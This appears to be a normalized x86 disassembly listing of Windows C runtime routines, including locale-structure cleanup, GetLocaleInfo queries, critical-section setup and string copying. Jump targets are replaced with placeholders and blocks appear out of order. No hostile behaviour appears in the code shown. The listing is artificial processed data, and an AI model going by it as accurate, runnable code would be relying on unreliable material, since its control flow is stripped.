push [ esi + 0x80 ]
call sub_41a7eb
push [ esi + 0x84 ]
call sub_41a7eb
push [ esi + 0x88 ]
call sub_41a7eb
push [ esi + 0x8c ]
call sub_41a7eb
push [ esi + 0x90 ]
call sub_41a7eb
push [ esi + 0x94 ]
call sub_41a7eb
push [ esi + 0x98 ]
call sub_41a7eb
push [ esi + 0x9c ]
call sub_41a7eb
push [ esi + 0xa0 ]
call sub_41a7eb
push [ esi + 0xa4 ]
call sub_41a7eb
push [ esi + 0xa8 ]
call sub_41a7eb
push [ esi + 0xbc ]
call sub_41a7eb
push [ esi + 0xc0 ]
call sub_41a7eb
push [ esi + 0xc4 ]
call sub_41a7eb
push [ esi + 0xc8 ]
call sub_41a7eb
push [ esi + 0xcc ]
call sub_41a7eb
add esp 0x40
push [ esi + 0xd0 ]
call sub_41a7eb
push [ esi + 0xb8 ]
call sub_41a7eb
push [ esi + 0xd8 ]
call sub_41a7eb
push [ esi + 0xdc ]
call sub_41a7eb
push [ esi + 0xe0 ]
call sub_41a7eb
push [ esi + 0xe4 ]
call sub_41a7eb
push [ esi + 0xe8 ]
call sub_41a7eb
push [ esi + 0xec ]
call sub_41a7eb
push [ esi + 0xd4 ]
call sub_41a7eb
push [ esi + 0xf0 ]
call sub_41a7eb
push [ esi + 0xf4 ]
call sub_41a7eb
push [ esi + 0xf8 ]
call sub_41a7eb
push [ esi + 0xfc ]
call sub_41a7eb
push [ esi + 0x100 ]
call sub_41a7eb
push [ esi + 0x104 ]
call sub_41a7eb
push [ esi + 0x108 ]
call sub_41a7eb
add esp 0x40
push [ esi + 0x10c ]
call sub_41a7eb
push [ esi + 0x110 ]
call sub_41a7eb
push [ esi + 0x114 ]
call sub_41a7eb
push [ esi + 0x118 ]
call sub_41a7eb
push [ esi + 0x11c ]
call sub_41a7eb
push [ esi + 0x120 ]
call sub_41a7eb
push [ esi + 0x124 ]
call sub_41a7eb
push [ esi + 0x128 ]
call sub_41a7eb
push [ esi + 0x12c ]
call sub_41a7eb
push [ esi + 0x130 ]
call sub_41a7eb
push [ esi + 0x134 ]
call sub_41a7eb
push [ esi + 0x138 ]
call sub_41a7eb
push [ esi + 0x13c ]
call sub_41a7eb
push [ esi + 0x140 ]
call sub_41a7eb
push [ esi + 0x144 ]
call sub_41a7eb
push [ esi + 0x148 ]
call sub_41a7eb
add esp 0x40
push [ esi + 0x14c ]
call sub_41a7eb
push [ esi + 0x150 ]
call sub_41a7eb
push [ esi + 0x154 ]
call sub_41a7eb
push [ esi + 0x158 ]
call sub_41a7eb
push [ esi + 0x15c ]
call sub_41a7eb
push [ esi + 0x160 ]
call sub_41a7eb
add esp 0x18
sub_42491e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_41c26e
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_423da8
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_4245a7
push edi
call sub_41a7eb
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_42499b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
push esi
call sub_41a7eb
pop ecx
sub_424a04
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_41c26e
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_41c229
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_41a7eb
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_41c229
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_41e4e9
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_42499b
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_41a7eb
push [ esi + 0xbc ]
call sub_41a7eb
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_41a7eb
push [ ebp - 0x8 ]
call sub_41a7eb
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_424bf4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_41a7eb
pop ecx
push esi
call sub_41a7eb
pop ecx
sub_424cf2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_41c26e
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_41c229
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_41a7eb
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_41c229
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_41e4e9
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_41a7eb
push [ ebp - 0x8 ]
call sub_41a7eb
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_424bf4
push ebx
call sub_41a7eb
push [ ebp - 0x8 ]
call sub_41a7eb
push [ ebp - 0x4 ]
call sub_41a7eb
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_41a7eb
push [ esi + 0xb0 ]
call sub_41a7eb
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_425055
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_42510d
push 0xc
push r--data
call sub_421220
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_41e4b0
push 0x1e
call sub_41e301
push 0xff
call sub_41f0ca
push 0x18
call sub_41c229
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_41c34a
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_421265
retn
push edi
call sub_41a7eb
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_41a7eb
pop ecx
call sub_41c34a
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4251c6
mov eax [ ebp - 0x1c ]
sub_4251cf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_42510d
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_41f36c
sub_425202
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_41efd5
mov eax esi
jmp r-xdata
sub_42526f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_41efd5
mov eax esi
jmp r-xdata
sub_425324
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_429e64
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_425386
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_41e140
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_41e140
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_429eab
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_42540a
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_42542f
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_425460
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_42547b
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_41e872
mov edx edi
mov esi eax
call sub_42542f
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_429e64
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_42540a
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_41ac09
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_425522
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_425460
push esi
mov edi eax
call sub_41d120
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_42557d
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_41e872
mov edx edi
lea esi [ eax + 0x9c ]
call sub_42542f
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_429e64
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_429e64
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_429e64
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_429fa3
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_429e64
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_41d120
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_42540a
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_41d120
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_425522
pop ecx
pop ecx
test eax eax
je r-xdata
sub_42574e
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_41e872
mov edx edi
lea esi [ eax + 0x9c ]
call sub_42542f
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_429e64
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_41ac09
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_429e64
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_425522
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_42580e
push [ esi ]
call sub_41d120
push [ esi + 0x4 ]
